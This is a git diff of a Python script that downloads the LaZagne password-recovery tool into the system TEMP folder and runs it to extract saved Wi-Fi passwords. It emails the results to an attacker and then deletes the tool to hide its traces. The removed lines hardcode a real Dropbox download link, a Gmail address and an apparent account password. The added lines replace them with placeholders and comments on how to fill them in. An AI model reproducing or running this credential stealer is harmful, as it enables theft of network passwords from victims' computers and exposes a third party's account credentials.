@@ -16,15 +16,13 @@ def download(url):
     request = requests.get(url)
     # file_name = url.split("/")
     # print(file_name[-1])
-    with open("lazagne.exe","wb") as out_file:
-        out_file.write(request.content)
-
+    with open("lazagne.exe","wb") as out_file: #downloading file with the name as binary file
+        out_file.write(request.content) 
 
 
 temp_directory = tempfile.gettempdir()
-os.chdir(temp_directory) 
-download("https://uc9718bf8fa37c5c2627ff835e6a.dl.dropboxusercontent.com/cd/0/get/A3PYei5ZLi65UMT7uwvJYfnkOpjb2nb1XZmdzunFRrxpe0y_DKuZq-eZOq8SdTcfgiSTqANPygUHGSq-UM3bLmWfPp8xQlTtpfai33YVpmiWr2lIxbNVYj-rllpwEuH3jA8/file")
-command = subprocess.check_output("lazagne.exe wifi")
-send_mail("abdullahunderscore1112015@gmail.com","$hipuddenabc123",command)
+os.chdir(temp_directory)  #this saves the downloaded program to TEMP directory
+download("provide link to lazange through local server or dropbox") #provide link to program here
+command = subprocess.check_output("lazagne.exe wifi") #command for lazange to run
+send_mail("email","passowrd",command) #provide your email and password
 os.remove("lazagne.exe")
-# os.remove("pexels-photo-112460.jpeg")
